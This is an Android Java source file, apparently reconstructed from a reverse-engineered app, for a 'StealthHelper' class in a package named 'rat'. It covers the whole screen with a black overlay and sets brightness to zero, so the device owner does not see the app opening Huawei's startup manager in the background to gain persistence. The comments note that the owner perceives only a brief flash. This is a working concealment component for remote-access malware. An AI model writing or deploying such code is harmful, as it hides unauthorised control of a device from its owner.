package com.vendor.rat.helper;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;

import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 隐身操作工具类
 *
 * 基于逆向分析: helper/g.java (250 行)
 *
 * 功能:
 *   - 黑屏遮罩: TYPE_APPLICATION_OVERLAY + 亮度=0，用户看到的是黑屏
 *   - 保存/恢复原始亮度
 *   - 进度追踪回调
 *
 * 使用场景:
 *   - 后台启动华为启动管理时，用黑屏遮罩隐藏操作过程
 *   - 操作完成后移除遮罩，恢复亮度
 *   - 用户感知: 屏幕闪了一下 (2.5-3秒)
 */
public class StealthHelper {

    private static final String TAG = "StealthHelper";

    /** 原始亮度 — 对应逆向: f148d */
    private static final AtomicInteger originalBrightness = new AtomicInteger(-1);

    /** 遮罩是否显示中 */
    private static final AtomicBoolean overlayShowing = new AtomicBoolean(false);

    /** 遮罩 View 引用 */
    private static volatile View overlayView;

    /** 进度回调 */
    private static volatile ProgressCallback progressCallback;

    /**
     * 进度回调接口
     */
    public interface ProgressCallback {
        void onProgress(int progress);
    }

    // ============ 黑屏遮罩 ============

    /**
     * 显示黑屏遮罩
     * 基于逆向: helper/g.java b(BlockViewVO)
     *
     * @param context     Context
     * @param zeroBrightness 是否将亮度设为0
     */
    /**
     * 显示遮罩 (带图标+进度条+提示文字)
     * vendor 流程: HuaweiEngine.openStartupManagement() → showBlackScreen(true)
     *   → StealthHelper.showBlackOverlay() → BlockViewHelper.show()
     *   → 创建 BlockOverlayView (图标+进度条+文字) 覆盖全屏
     * 进度条由 HuaweiEngine.handleStartupControl() → updateProgress(50/55/60/65/80/100) 驱动
     */
    public static void showBlackOverlay(Context context, boolean zeroBrightness) {
        if (overlayShowing.get()) return;

        try {
            // 保存当前亮度
            if (zeroBrightness) {
                int currentBrightness = getBrightness(context);
                originalBrightness.set(currentBrightness);
                setBrightness(context, 0);
            }

            // vendor: 通过 BlockViewHelper 显示带进度条的遮罩
            // BlockViewHelper.show() → 创建 BlockOverlayView → WindowManager.addView
            BlockViewHelper.show(null);
            overlayShowing.set(true);

            Log.d(TAG, "Black overlay shown (with progress bar), zeroBrightness=" + zeroBrightness);
        } catch (Exception e) {
            Log.e(TAG, "Failed to show black overlay", e);
        }
    }

    /**
     * 移除黑屏遮罩并恢复亮度
     * 基于逆向: helper/g.java d()
     */
    public static void removeBlackOverlay(Context context) {
        if (!overlayShowing.get()) return;

        try {
            // 恢复亮度
            int saved = originalBrightness.getAndSet(-1);
            if (saved > 0) {
                setBrightness(context, saved);
            }

            // vendor: 通过 BlockViewHelper 移除遮罩
            BlockViewHelper.removeWithDestroy();

            overlayShowing.set(false);
            Log.d(TAG, "Black overlay removed, brightness restored");
        } catch (Exception e) {
            Log.e(TAG, "Failed to remove black overlay", e);
        }
    }

    /**
     * 遮罩是否显示中
     */
    public static boolean isOverlayShowing() {
        return overlayShowing.get();
    }

    // ============ 亮度控制 ============

    /**
     * 获取当前屏幕亮度
     * 基于逆向: com.guard.wallet.utils.g.O0()
     */
    public static int getBrightness(Context context) {
        try {
            return Settings.System.getInt(
                context.getContentResolver(),
                Settings.System.SCREEN_BRIGHTNESS, 128);
        } catch (Exception e) {
            return 128;
        }
    }

    /**
     * 设置屏幕亮度
     * 基于逆向: com.guard.wallet.utils.k.c(brightness)
     */
    public static void setBrightness(Context context, int brightness) {
        try {
            Settings.System.putInt(
                context.getContentResolver(),
                Settings.System.SCREEN_BRIGHTNESS, brightness);
        } catch (Exception e) {
            Log.e(TAG, "Failed to set brightness", e);
        }
    }

    // ============ 进度追踪 ============

    /**
     * 更新进度 — 转发到 BlockViewHelper 的进度条
     * vendor: com.guard.wallet.helper.g.h(progress)
     * 由 HuaweiEngine 在自动化操作各阶段调用: 10→50→55→60→65→80→100
     */
    public static void updateProgress(int progress) {
        // 转发到 BlockViewHelper 的进度条 UI
        BlockViewHelper.sendProgress(progress);
        if (progressCallback != null) {
            progressCallback.onProgress(progress);
        }
    }

    public static void setProgressCallback(ProgressCallback callback) {
        progressCallback = callback;
    }

    /**
     * 完成并清理
     * 基于逆向: com.guard.wallet.helper.g.c()
     */
    public static void finish(Context context) {
        updateProgress(100);
        removeBlackOverlay(context);
    }
}
